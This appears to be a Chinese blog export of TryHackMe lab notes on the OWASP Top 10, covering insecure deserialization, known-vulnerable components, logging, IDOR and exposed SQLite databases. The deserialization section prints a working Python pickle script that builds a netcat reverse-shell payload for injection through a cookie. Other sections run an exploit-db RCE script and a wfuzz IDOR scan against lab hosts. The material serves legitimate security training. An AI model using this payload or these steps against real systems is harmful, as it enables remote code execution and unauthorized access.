                     data-src="/../articleimg/image-20221207151730728.png"
                      alt="image-20221207151730728"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207151819237.png"
                      alt="image-20221207151819237"
                ></p>
<blockquote>
<p>THM{heres_the_admin_flag} </p>
</blockquote>
<h2 id="严重程度TOP8-不安全的反序列化-代码执行"><a href="#严重程度TOP8-不安全的反序列化-代码执行" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-代码执行"></a>[严重程度TOP8] 不安全的反序列化-代码执行</h2><p>这是一种比简单地解码 cookie 更加邪恶的攻击，我们将深入了解它的本质。</p>
<p><strong>继续使用上节中的示例进行设置</strong></p>
<p>1、先将cookie中的userType的值从“admin”重新改为“user”，返回<a class="link"   href="http://machine_ip/myprofile" >http://MACHINE_IP/myprofile <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面。</p>
<p>2.然后，左键单击下面截图中“Exhange your vim”上的 URL链接。（此处的vim指：Vertical Improved Mail–垂直改进邮件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207152555143.png"
                      alt="image-20221207152555143"
                ></p>
<p>3.完成上述操作后，左键单击上图中的“Provide your feedback!–提供您的反馈！”上的 URL链接，你将直接转到下图的页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207152722157.png"
                      alt="image-20221207152722157"
                ></p>
<p><strong>怎样利用以上设置？</strong></p>
<p>如果用户在表单中输入了他们的反馈信息，则相关数据可能会经过编码处理并发送到 Flask 应用程序（这些数据可能会被存储到数据库中）；但是，发生以上过程的前提条件是：目标应用程序会假定任何已编码的数据都是可信的（此条件在现实环境下可能并不能满足）。</p>
<p>了解下面代码片段中发生的事情很重要：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207153718508.png"
                      alt="image-20221207153718508"
                ></p>
<p>当你访问“Exchange your vim”URL链接时，一个 cookie 将被编码处理并存储在你的浏览器中 - 我们可以尝试修改！而一旦你访问反馈表单，前述经过编码处理的 cookie 值就会被解码并执行反序列化过程。 在下面的代码片段中，我们可以看到cookie是如何被检索的，并最终通过 <code>pickle.loads</code> 完成反序列化过程。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207154218107.png"
                      alt="image-20221207154218107"
                ></p>
<p>此漏洞利用了Python中的<code>Pickle</code>，我们可以借此机制尝试建立一个反向 shell。</p>
<p><strong>漏洞利用</strong></p>
<p>1.首先，我们需要在攻击机上设置一个 netcat 监听器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207154725552.png"
                      alt="image-20221207154725552"
                ></p>
<p>因为被反序列化的代码来自于 base64 格式的cookie内容，所以我们不能简单地生成一个反向 shell，我们必须使用 base64 对我们需要执行的命令进行编码处理，以便最终能够执行恶意代码。</p>
<p>2.完成监听器的设置后，将 python 文件 (<a class="link"   href="https://assets.tryhackme.com/additional/cmn-owasptopten/pickleme.py" >pickelme.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 中的源代码复制并粘贴到你的攻击机上，修改源代码将“YOUR_TRYHACKME_VPN_IP”替换为你的攻击机所使用的 TryHackMe VPN IP。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207155331116.png"
                      alt="image-20221207155331116"
                ></p>
<p>3.通过 python3执行“ pickelme.py”并查看命令的输出结果（下图命令中的rce.py即是修改内容之后的pickelme.py）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207155919908.png"
                      alt="image-20221207155919908"
                ></p>
<p>4.复制并粘贴以上输出结果中的 两个单引号标记（’DATA’）之间的所有内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207160302850.png"
                      alt="image-20221207160302850"
                ></p>
<p>5.将其粘贴到浏览器中的“encodedPayload”cookie值中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207160531109.png"
                      alt="image-20221207160531109"
                ></p>
<p>6.确保我们的攻击机上的 netcat 侦听器仍在运行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207160616402.png"
                      alt="image-20221207160616402"
                ></p>
<p>7.在个人资料页面 点击提交反馈对应的URL链接(这将触发对cookie值进行反序列化的过程)，在攻击机上将接收到一个反向shell，我们可以通过这个shell界面查看flag.txt文件内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207160723115.png"
                      alt="image-20221207160723115"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207160901060.png"
                      alt="image-20221207160901060"
                ></p>
<p>实际操作步骤和本节内容所介绍的基本一致：</p>
<p>修改userType值为user</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207161146842.png"
                      alt="image-20221207161146842"
                ></p>
<p>回到个人资料页面 <a class="link"   href="http://machine_ip/myprofile" >http://MACHINE_IP/myprofile <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，点击<em>Exchange your vim</em>链接（此处的vim指：Vertical Improved Mail–垂直改进邮件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207161312676.png"
                      alt="image-20221207161312676"
                ></p>
<p>点击链接之后，我们可以看到cookie发生了变化</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207162549336.png"
                      alt="image-20221207162549336"
                ></p>
<p>现在可以开始反序列化漏洞利用过程：主要操作是构建一段经过base64编码处理的恶意代码，用恶意代码替换上图中的指定cookie值–即encodedPayload的值；我们使用以下py脚本来生成一段可以用于建立反向shell的base64格式的payload：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">command = <span class="string">&#x27;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | netcat YOUR_TRYHACKME_VPN_IP 4444 &gt; /tmp/f&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">rce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure></div>

<p>修改ip地址为攻击机ip地址(此处ip地址为tun0网卡对应地址)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207163535284.png"
                      alt="image-20221207163535284"
                ></p>
<p>在攻击机上设置Netcat监听器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207164140555.png"
                      alt="image-20221207164140555"
                ></p>
<p>执行脚本，获得payload(取单引号中的内容作为payload)并填充至指定的cookie值中–即encodedPayload的对应值：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207163952013.png"
                      alt="image-20221207163952013"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207164207319.png"
                      alt="image-20221207164207319"
                ></p>
<p>在个人资料页面 点击提交反馈对应的URL链接，这将触发对之前所修改的指定cookie值的反序列化过程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207164305760.png"
                      alt="image-20221207164305760"
                ></p>
<p>回到攻击机终端界面，获得一个反向shell，使用该shell界面查找flag.txt文件，并查看其内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207164914268.png"
                      alt="image-20221207164914268"
                ></p>
<blockquote>
<p>4a69a7ff9fd68</p>
</blockquote>
<h2 id="严重程度TOP9-具有已知漏洞的组件-简介"><a href="#严重程度TOP9-具有已知漏洞的组件-简介" class="headerlink" title="[严重程度TOP9] 具有已知漏洞的组件-简介"></a>[严重程度TOP9] 具有已知漏洞的组件-简介</h2><p>有时，你可能会发现你正在进行渗透测试的公司所使用的应用程序本身就存在有充分记录的已知漏洞。</p>
<p>例如，假设现在有一家公司已经有几年没有更新他们的 WordPress 版本，通过使用诸如 wpscan 之类的工具进行扫描，你发现了它是 4.6 版本的WordPress，经过调查你会发现 WordPress 4.6 版本容易受到未经身份验证的远程代码执行 (RCE) 攻击，也许你还可以在漏洞利用数据库<strong>exploit-db</strong>中找到<a class="link"   href="https://www.exploit-db.com/exploits/41962" >相关的漏洞exp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>正如你所看到的，这将是一件非常具有破坏性的事情，在这种情况下攻击者只需要做很少的工作就能完成攻击，因为目标应用程序的相关漏洞可能已经众所周知，其他攻击者也已经利用过了相关漏洞，所以，如果一家公司错过了他们所使用的应用程序的一次版本更新或者补丁更新，那么他们就可能遭受一些来自不法份子的网络攻击。</p>
<p>OWASP组织将 具有已知漏洞的组件 评级为流行等级3（意思是有较高的流行度），因为在现实情况下，目标公司往往很容易错过对目标应用程序的及时更新。</p>
<h2 id="严重程度TOP9-具有已知漏洞的组件-漏洞利用"><a href="#严重程度TOP9-具有已知漏洞的组件-漏洞利用" class="headerlink" title="[严重程度TOP9] 具有已知漏洞的组件-漏洞利用"></a>[严重程度TOP9] 具有已知漏洞的组件-漏洞利用</h2><p>因为目标应用程序存在已知漏洞的组件，所以大部分攻击工作已经为我们完成了。我们的主要工作是找出目标软件的信息，并对其进行研究，直到找到相关的已知漏洞详情。</p>
<p>接下来，让我们通过一个Web 应用程序示例来了解一下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207171014001.png"
                      alt="image-20221207171014001"
                ></p>
<p>假设目标正在使用web服务器-nostromo 的默认页面，那么现在我们知道了目标应用程序的版本号和相关的软件名称，我们可以使用 <a class="link"   href="https://www.exploit-db.com/" >exploit-db <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来尝试找到这个特定版本的nostromo 漏洞。（注意：exploit-db 非常有用，对于网络安全初学者来说，你可能会经常使用它，所以最好熟悉它）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207171639350.png"
                      alt="image-20221207171639350"
                ></p>
<p>如上图所示，我们找到了一个相关的漏洞利用脚本，让我们下载它并尝试执行代码，然而单独运行这个脚本的结果并未如我们所愿，它会给出如下图所示的报错信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207171908610.png"
                      alt="image-20221207171908610"
                ></p>
<p>有时候，第一次执行exp可能并不会起作用，所以了解脚本相关的编程语言会对我们进行漏洞利用有所帮助，如果需要的话，你可以尝试修复任何exp执行错误或者进行任何exp内容的修改工作，因为 exploit-db 上的很多脚本都需要经过修改才能被成功执行。</p>
<p>幸运的是，在本例中的exp相关错误是由本应被注释的行所引起的，因此我们很容易修复该exp–我们将以下代码行注释即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207172421592.png"
                      alt="image-20221207172421592"
                ></p>
<p>解决以上问题之后，让我们再次尝试运行exp。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207172547885.png"
                      alt="image-20221207172547885"
                ></p>
<p>我们成功执行了RCE，需要注意的是，大多数exp脚本只会告诉我们需要给它提供哪些参数以便完成漏洞利用过程，exp开发人员很少会让你 为了弄清楚如何使用exp脚本而去阅读数百行代码。</p>
<p>有时你会很容易得到应用程序的版本号，但其他时候你可能还需要挖掘 HTML 源代码，或者需要猜测一个能够被成功使用的漏洞利用脚本；如果目标应用程序的相关漏洞是一个已知漏洞，则总有办法可以尝试发现目标应用程序所运行的版本信息。</p>
<h2 id="严重程度TOP9-具有已知漏洞的组件-实验"><a href="#严重程度TOP9-具有已知漏洞的组件-实验" class="headerlink" title="[严重程度TOP9] 具有已知漏洞的组件-实验"></a>[严重程度TOP9] 具有已知漏洞的组件-实验</h2><p>实验：现在有一个易受攻击的应用程序，我们已知该目标具有已知漏洞的组件，我们需要通过公开的信息完成整个漏洞利用过程。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207173910294.png"
                      alt="image-20221207173910294"
                ></p>
<p>启动目标机器，用攻击机访问目标站点：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207183040245.png"
                      alt="image-20221207183040245"
                ></p>
<p>在 <a class="link"   href="https://www.exploit-db.com/" >https://www.exploit-db.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 搜索目标应用程序，点击下载即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207183407087.png"
                      alt="image-20221207183407087"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207183637612.png"
                      alt="image-20221207183637612"
                ></p>
<p>在攻击机上使用exp，指定目标url参数：</p>
<blockquote>
<p>python 47887.py <a class="link"   href="http://10.10.52.29/" >http://10.10.52.29/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207184053851.png"
                      alt="image-20221207184053851"
                ></p>
<blockquote>
<p>1611</p>
</blockquote>
<h2 id="严重程度TOP10-日志记录和监控不足"><a href="#严重程度TOP10-日志记录和监控不足" class="headerlink" title="[严重程度TOP10] 日志记录和监控不足"></a>[严重程度TOP10] 日志记录和监控不足</h2><p>在设置 Web 应用程序时，应该记录用户执行的每个操作，这些日志记录很重要，因为在发生安全事件时，日志可以用于跟踪攻击者的行为；一旦追踪到攻击者的行为，就可以确定他们所进行的行为的安全风险和安全影响。 如果没有日志记录，就无法判断攻击者在获得对特定 Web 应用程序的访问权限之后 具体执行了哪些操作，其中更大的影响包括：</p>
<ul>
<li>监管损失：如果攻击者获得了对用户个人身份信息的访问权限并且没有留下日志记录，不仅应用程序的用户本身会受到安全影响，该应用程序的所有者也可能会按照当地法律法规受到罚款或其他更严厉的处罚。</li>
<li>进一步攻击的风险：如果目标应用程序不进行日志记录，则可能无法检测到攻击者的存在，这可能会允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步的攻击。</li>
</ul>
<p>日志中存储的信息应包括：</p>
<ul>
<li>HTTP status codes（HTTP状态码）</li>
<li>Time Stamps（时间戳）</li>
<li>Usernames（用户名）</li>
<li>API endpoints&#x2F;page locations（API 端点&#x2F;页面 位置）</li>
<li>IP addresses（IP地址）</li>
</ul>
<p>这些日志确实包含一些敏感信息，因此确保安全存储日志并将这些日志的多个副本存储在不同位置非常重要。</p>
<p>你可能已经注意到，在发生网络安全违规或事件后，日志记录显得尤为重要。理想的情况是 目标应用程序能够进行行为监控以检测任何可疑活动，而检测这种可疑活动的目的要么是为了完全阻止攻击者，要么是当检测到攻击者的时间比预期晚得多时（如：在攻击者入侵十天之后才检测到）尽可能地减少攻击者所造成的影响。可疑活动的常见示例包括：</p>
<ul>
<li><p>多次未经授权的特定操作尝试：通常是身份验证尝试或者访问未经授权的资源–例如管理员页面。</p>
</li>
<li><p>来自异常 IP 地址或位置的请求：这可能表明其他人正在尝试访问特定用户的帐户，注意：具有一定误报率。</p>
</li>
<li><p>使用自动化工具：特定的自动化工具可以很容易地被目标应用程序所识别，例如，检测用户所使用的 User-Agent 标头的值或用户发出请求的速度，这些特征可能表明攻击者正在使用自动化工具。</p>
</li>
<li><p>常见有效载荷（Payload）：在 Web 应用程序中，攻击者可能会使用跨站点脚本 (XSS)等一系列有效载荷，通过检测这些有效载荷的使用情况 就可以得知是否有人在对目标应用程序进行未经授权&#x2F;恶意测试。</p>
</li>
</ul>
<p>仅仅检测可疑活动还不够，还需要根据影响级别对这种可疑活动进行评级；某些攻击行为会比其他攻击行为产生更大的影响，这些影响较大的行动需要优先做应急响应处理，因此应该针对性地发出告警，以引起相关管理方的注意。</p>
<p>接下来，我们需要通过分析示例日志文件来实践本节相关知识点。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207192855705.png"
                      alt="image-20221207192855705"
                ></p>
<p>下载本小节对应的附件，打开示例日志文件并查看其内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207192913323.png"
                      alt="image-20221207192913323"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207192955916.png"
                      alt="image-20221207192955916"
                ></p>
<p>分析该日志文件的内容可知：</p>
<p>1.在短时间内有人进行了四次登录操作，对应的可疑ip地址为：49.99.13.16</p>
<p>2.四次登录操作使用的是不同的用户账户，所以相关的一系列行为属于：暴力破解攻击（Brute Force）</p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-OWASP Top 10(2021版)-学习</title>
    <url>/2024/01/27/THM-OWASP%20Top%2010(2021%E7%89%88)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/owasptop102021" >https://tryhackme.com/room/owasptop102021 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解并利用OWASP Top 10漏洞中的每一个，它们是十大最严重的Web安全风险。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129220611499-1706333741993-1.png"
                      alt="image-20221129220611499"
                ></p>
<p>本文将对每个 OWASP 主题进行分析，并会包含关于漏洞主要原理、漏洞如何产生以及如何利用漏洞的详细信息。</p>
<ol>
<li>Broken Access Control：失效的访问控制</li>
<li>Cryptographic Failures：加密机制失败</li>
<li>Injection：注入</li>
<li>Insecure Design：不安全的设计</li>
<li>Security Misconfiguration：安全配置错误</li>
<li>Vulnerable and Outdated Components：易受攻击和过时的组件</li>
<li>Identification and Authentication Failures：身份识别和身份验证错误</li>
<li>Software and Data Integrity Failures：软件和数据完整性故障</li>
<li>Security Logging &amp; Monitoring Failures：安全日志和监控故障</li>
<li>Server-Side Request Forgery (SSRF)：服务器端请求伪造 (SSRF)</li>
</ol>
<p>在学习本文内容时，并不需要具备任何网络安全基础知识。</p>
<p><strong>本文使用的是OWASP TOP 10的2021年标准</strong>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205235710045-1706333741994-2.png"
                      alt="image-20221205235710045"
                ></p>
<h2 id="TOP1-失效的访问控制"><a href="#TOP1-失效的访问控制" class="headerlink" title="[TOP1]失效的访问控制"></a>[TOP1]失效的访问控制</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205112914400-1706333741994-3.png"
                      alt="image-20221205112914400"
                ></p>
<p>目标网站的某些页面可能会受到保护，从而不允许普通访问者对相关页面进行访问，例如，只有网站的管理员(admin)用户才能被允许访问用于管理其他用户的网站页面；如果目标网站的普通访问者能够访问他们无权查看的受保护页面，那么就代表目标站点的访问控制正处于失效状态。</p>
<p>如果网站的普通访问者能够访问受保护的页面，那么可能会导致以下情况：</p>
<ul>
<li>能够查看目标网站上其他用户的敏感信息。</li>
<li>能够访问目标网站中未经授权的功能。</li>
</ul>
<p>如果未经身份验证的用户可以访问目标站点的任何一个页面，则说明目标网站存在访问控制缺陷；如果非管理员用户可以访问管理页面，也说明目标网站存在访问控制缺陷。</p>
<p>简而言之，失效的访问控制将<em><strong>允许攻击者绕过授权</strong></em>（即：发生越权操作），这可以让他们像特权用户(此处不单指admin用户，而是指相对于普通用户权限更高的用户)一样查看敏感数据或者执行其他未授权操作。</p>
<p>例如，在<a class="link"   href="https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/" >2019年发现了一个漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，攻击者可以从被标记为私有的YouTube视频中获取任何单个帧；发现该漏洞的研究人员表明，他可以利用此漏洞请求私有视频的几个帧并能在一定程度上重建视频。由于用户将某个YouTube视频标记为私有时的心理期望是没有人可以随意访问它，因此这的确可以被认为是一个失效的访问控制漏洞。</p>
<h2 id="失效的访问控制-IDOR挑战"><a href="#失效的访问控制-IDOR挑战" class="headerlink" title="失效的访问控制(IDOR挑战)"></a>失效的访问控制(IDOR挑战)</h2><p><strong>不安全的直接对象引用(IDOR-Insecure Direct Object Reference)</strong></p>
<p>IDOR或不安全的直接对象引用是指存在访问控制漏洞，我们可以通过该漏洞访问我们通常看不到的资源；当开发人员公开了直接对象引用时，就可能会发生这种情况，这里的引用是指引用服务器内特定对象的标识符，而具体的对象可以是文件、用户、银行应用程序中的银行帐户或者其他任何真实存在的互联网资源。</p>
<p>例如，假设我们正在登录银行帐户，当正确验证了自己的身份之后，我们可能会看到这样的URL<code>https://bank.thm/account?id=111111</code>；在此页面上，我们可以看到自己银行帐户的所有重要详细信息，作为用户我们将会在该页面继续做一些我们想做的事情，并认为没有任何问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106005505612.png"
                      alt="image-20240106005505612"
                ></p>
<p>然而，在上述页面中可能存在一个潜在的巨大问题，那就是我们可以尝试将<code>id</code>参数的值修改为<code>222222</code>或者其他值，然后再进行访问，如果网站的配置不正确，那么我们就可以成功访问到其他人的银行帐户信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106005516360.png"
                      alt="image-20240106005516360"
                ></p>
<p>在刚才的例子中，相关Web应用程序通过URL中的<code>id</code>参数公开了直接对象引用，而该参数指向的是特定帐户，如果该Web应用程序不会检查已登录的用户是否有权访问被<code>id</code>参数所引用的帐户，那么攻击者就可以通过IDOR漏洞获取其他用户的敏感信息。</p>
<p>注意：直接对象引用并不是导致IDOR漏洞的原因，相关Web应用程序没有验证已登录的用户是否有权访问特定参数所请求的帐户才是导致IDOR漏洞的关键。</p>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节内容，并回答以下问题。</p>
<p>部署目标机器，使用攻击机的浏览器访问<code>http://MACHINE_IP</code> ，并且使用用户名<code>noot</code>和密码<code>test1234</code>进行登录操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106171911868.png"
                      alt="image-20240106171911868"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106172004286.png"
                      alt="image-20240106172004286"
                ></p>
<p>修改URL参数以尝试查看其他用户的notes：</p>
<p>tips：我们也可以使用FUZZ工具（如wfuzz）来进行测试–<code>?note_id=FUZZ</code>范围设置为0到100即可。</p>
<p><code>wfuzz -c --hh 0 -z range,0-100 http://10.10.194.227/note.php?note_id=FUZZ</code></p>
<p>发现只有0和1对应的响应码为200。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106172129192.png"
                      alt="image-20240106172129192"
                ></p>
<blockquote>
<p>我们找到的flag内容为：flag{fivefourthree} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106172829202.png"
                      alt="image-20240106172829202"
                ></p>
<h2 id="TOP2-加密机制失效"><a href="#TOP2-加密机制失效" class="headerlink" title="[TOP2]加密机制失效"></a>[TOP2]加密机制失效</h2><p>Web应用程序通常需要使用加密技术来为其用户提供多方面的机密性，而加密机制失效是指因误用(或缺乏使用)保护敏感信息的加密算法而产生的漏洞。</p>
<p>以一个安全的电子邮件应用程序为例：</p>
<ul>
<li>当我们使用浏览器访问电子邮件帐户时，我们需要确保浏览器端与服务器端之间的通信经过了加密处理；这样，任何试图捕获我们的网络数据包的窃听者都将无法恢复关于我们的电子邮件地址的内容，当我们加密客户端和服务器之间的网络流量时，我们通常将此过程称为对传输中的数据进行加密。</li>
<li>由于我们的电子邮件被存储在邮件提供商所管理的某些服务器中，因此我们也希望电子邮件提供商无法读取其客户的电子邮件；为此，我们的电子邮件也可能会被加密存储在相关服务器上，这被称为静态数据加密。</li>
</ul>
<p>加密机制失效通常会导致Web应用程序意外泄露敏感数据，这些数据一般是与客户直接相关的数据(例如姓名、出生日期、财务信息)，但也可能会是一些技术上的信息，例如用于实现登录的用户名和密码。</p>
<p>在更复杂的层面上，利用加密机制失效漏洞时通常还会涉及诸如“中间人攻击”之类的技术，攻击者可以通过这种技术强制用户连接到由攻击者所控制的网络设备，然后，攻击者会利用任何被传输数据的弱加密性来获取已截获的信息(即使数据一开始就被加密，攻击者也能通过这种方法来尝试获取敏感数据)。</p>
<p>tips：事实上，某些敏感数据可以直接在目标Web服务器本身上被找到。</p>
<h2 id="加密机制失效-材料一"><a href="#加密机制失效-材料一" class="headerlink" title="加密机制失效(材料一)"></a>加密机制失效(材料一)</h2><p>以可从多个位置轻松访问的格式存储大量数据的最常见方法是使用数据库，这对于Web应用程序来说是很好的办法，因为可能会有许多用户在任意时间与目标网站发生交互。数据库引擎通常遵循结构化查询语言 (SQL-<strong>S</strong>tructured <strong>Q</strong>uery <strong>L</strong>anguage) 语法，当然，一些替代方案（例如 NoSQL）也越来越受欢迎。</p>
<p>在生产环境中，通常会看到在运行数据库服务(如MySQL或MariaDB等数据库服务)的专用服务器上设置数据库；但是，数据库也可以被存储为文件，这些文件形式的数据库被称为“平面文件(flat-file)”数据库，它们是作为单个文件被存储在计算机上的。 使用“平面文件(flat-file)”比设置完整的数据库服务器要容易得多，因此这种方法可能会在较小的Web应用程序中看到。</p>
<p>如前所述，平面文件数据库是作为文件存储在计算机磁盘上的，这对于Web应用程序来说不是问题，但如果将平面文件数据库存储在网站的根目录下(即变成连接到网站的用户所能够访问的文件之一)，会发生什么情况呢？ 这将导致我们可以直接下载网站的数据库文件到我们的本地机器上，并且可以完全访问对应的数据库文件中的所有内容，从而将导致敏感数据泄露。</p>
<p>让我们简要介绍一些用于查询平面文件数据库的语法。</p>
<p>平面文件数据库最常见(也是最简单)的格式是SQLite数据库，我们可以在大多数编程语言环境下与该格式的数据库进行交互，并且还可以使用一个专门的客户端通过命令行查询SQLite数据库的信息，这个专门的客户端叫做<code>sqlite3</code>，它在许多Linux发行版系统中会进行默认安装。</p>
<p>假设我们已经成功地下载了一个数据库文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106220956338.png"
                      alt="image-20240106220956338"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@linux$ </span><span class="language-bash"><span class="built_in">ls</span> -l</span> </span><br><span class="line">-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db</span><br><span class="line">                                                                                                                                                              </span><br><span class="line"><span class="meta prompt_">user@linux$ </span><span class="language-bash">file example.db</span> </span><br><span class="line">example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1</span><br></pre></td></tr></table></figure></div>

<p>我们可以看到当前文件夹中有一个SQLite数据库，为了访问该数据库，我们可以使用<code>sqlite3 &lt;database-name&gt;</code>命令语法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106222748471.png"
                      alt="image-20240106222748471"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@linux$ </span><span class="language-bash">sqlite3 example.db</span>                     </span><br><span class="line">SQLite version 3.39.2 2022-07-21 15:24:47</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span></span><br></pre></td></tr></table></figure></div>

<p>然后我们可以继续使用<code>.tables</code>命令来查看数据库中的表：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106222900375.png"
                      alt="image-20240106222900375"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@linux$ </span><span class="language-bash">sqlite3 example.db</span>                     </span><br><span class="line">SQLite version 3.39.2 2022-07-21 15:24:47</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.tables</span></span><br><span class="line">customers</span><br></pre></td></tr></table></figure></div>

<p>现在我们可以转储表中的所有数据，但是在不查看表信息的前提下，我们并不一定知道表中每列的含义；我们可以先使用<code>PRAGMA table_info(customers);</code>查看表信息，然后再使用<code>SELECT * FROM customers;</code>来从表中转储信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240106230359645.png"
                      alt="image-20240106230359645"
                ></p>
